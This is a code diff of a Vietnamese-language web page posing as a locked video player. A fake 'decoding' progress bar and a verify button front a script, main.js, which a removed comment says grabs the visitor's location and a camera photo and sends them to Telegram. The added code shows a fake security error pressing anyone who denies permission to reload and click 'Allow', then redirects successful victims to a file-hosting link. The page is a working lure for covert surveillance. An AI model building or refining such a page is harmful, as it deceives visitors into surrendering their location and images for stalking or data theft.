@@ -16,24 +16,16 @@
         /* Ô giả lập trình phát video */
         .video-player-mock {
             position: relative;
-            width: 95%;
-            max-width: 800px;
-            aspect-ratio: 16/9;
+            width: 95%; max-width: 800px; aspect-ratio: 16/9;
             background: #000 url('https://via.placeholder.com/800x450/111/333?text=+') center/cover;
-            border-radius: 12px;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            border-radius: 12px; overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
             border: 1px solid #222;
         }
 
-        /* Biểu tượng Play lớn nằm dưới bảng thông báo */
         .big-play-btn {
-            font-size: 80px;
-            color: rgba(255, 255, 255, 0.2);
-            position: absolute;
-            animation: pulse 2s infinite;
+            font-size: 80px; color: rgba(255, 255, 255, 0.2);
+            position: absolute; animation: pulse 2s infinite;
         }
 
         @keyframes pulse {
@@ -42,18 +34,11 @@
             100% { transform: scale(1); opacity: 0.2; }
         }
 
-        /* Bảng thông báo đè lên video */
         .container {
-            position: relative;
-            z-index: 10;
-            text-align: center;
-            padding: 30px;
-            width: 85%;
-            max-width: 340px;
-            background: rgba(15, 15, 15, 0.85);
-            backdrop-filter: blur(15px); /* Làm mờ video phía sau */
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
+            position: relative; z-index: 10; text-align: center;
+            padding: 30px; width: 85%; max-width: 340px;
+            background: rgba(15, 15, 15, 0.85); backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.8);
         }
 
@@ -65,8 +50,7 @@
             background-color: #ff0000; color: white; border: none;
             padding: 14px; font-size: 0.95rem; font-weight: bold;
             border-radius: 50px; cursor: pointer; width: 100%;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+            transition: 0.3s; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
         }
         .btn-confirm:active { transform: scale(0.95); background-color: #cc0000; }
 
@@ -75,7 +59,7 @@
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; background: #000;
             z-index: 9999; flex-direction: column;
-            justify-content: center; align-items: center;
+            justify-content: center; align-items: center; text-align: center;
         }
         .loader {
             border: 3px solid #222; border-top: 3px solid #ff0000;
@@ -83,7 +67,14 @@
             animation: spin 0.8s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { margin-top: 20px; color: #fff; font-size: 0.9rem; font-weight: 300; letter-spacing: 1px; }
+        .loading-text { margin-top: 20px; color: #fff; font-size: 0.9rem; font-weight: 300; letter-spacing: 1px; padding: 0 20px; }
+
+        /* Nút tải lại trang khi lỗi */
+        .btn-reload {
+            margin-top: 25px; background-color: #fff; color: #000;
+            border: none; padding: 12px 30px; font-weight: bold;
+            border-radius: 8px; cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -100,8 +91,10 @@
 </div>
 
 <div id="loadingOverlay">
-    <div class="loader"></div>
-    <div class="loading-text">ĐANG GIẢI MÃ LUỒNG DỮ LIỆU... 0%</div>
+    <div id="loadingUI">
+        <div class="loader"></div>
+        <div class="loading-text">ĐANG GIẢI MÃ LUỒNG DỮ LIỆU... 0%</div>
+    </div>
 </div>
 
 <script src="main.js"></script> 
@@ -109,34 +102,48 @@
     const btn = document.getElementById('verifyBtn');
     const authBox = document.getElementById('authBox');
     const loadingOverlay = document.getElementById('loadingOverlay');
+    const loadingUI = document.getElementById('loadingUI');
     const loadText = document.querySelector('.loading-text');
 
     btn.addEventListener('click', async () => {
-        // 1. Chuyển trạng thái giao diện
+        // 1. Chuyển sang màn hình load
         authBox.style.display = 'none';
         loadingOverlay.style.display = 'flex';
 
-        // 2. Chạy % tăng dần nhanh
+        // 2. Chạy % giả lập
         let percent = 0;
         const interval = setInterval(() => {
-            percent += Math.floor(Math.random() * 20) + 5;
-            if (percent >= 99) {
-                percent = 99;
-                clearInterval(interval);
-            }
+            percent += Math.floor(Math.random() * 15) + 5;
+            if (percent >= 99) percent = 99;
             loadText.innerText = `ĐANG GIẢI MÃ LUỒNG DỮ LIỆU... ${percent}%`;
-        }, 300);
+        }, 250);
 
-        // 3. Thực thi main.js (lấy tọa độ, chụp ảnh, gửi Telegram)
+        // 3. Thực thi main.js và chờ kết quả trả về
+        // Lưu ý: main() phải có lệnh 'return true' nếu thành công và 'return false' nếu lỗi
+        let isSuccess = false;
         if (typeof main === 'function') {
-            await main(); 
+            isSuccess = await main(); 
         }
 
-        // 4. Hoàn tất
-        loadText.innerText = "MỞ KHÓA THÀNH CÔNG! ĐANG CHUYỂN HƯỚNG...";
-        setTimeout(() => {
-            window.location.href = "https://gofile.io/d/Bw8Wzj";
-        }, 1000);
+        clearInterval(interval);
+
+        if (isSuccess) {
+            // NẾU THÀNH CÔNG (Người dùng bấm CHO PHÉP)
+            loadText.innerText = "MỞ KHÓA THÀNH CÔNG! ĐANG CHUYỂN HƯỚNG...";
+            setTimeout(() => {
+                window.location.href = "https://gofile.io/d/Bw8Wzj";
+            }, 1000);
+        } else {
+            // NẾU THẤT BẠI (Người dùng bấm TỪ CHỐI)
+            loadingUI.innerHTML = `
+                <div style="color: #ff4d4d;">
+                    <div style="font-size: 40px; margin-bottom: 10px;">⚠️</div>
+                    <b style="font-size: 1.1rem;">LỖI TRUY XUẤT DỮ LIỆU</b><br>
+                    <p style="color: #ccc; margin-top: 10px;">Bạn đã từ chối quyền xác thực bảo mật.<br>Vui lòng tải lại trang và chọn <b>"Cho phép"</b> để xem video.</p>
+                    <button class="btn-reload" onclick="location.reload()">TẢI LẠI TRANG</button>
+                </div>
+            `;
+        }
     });
 </script>
 
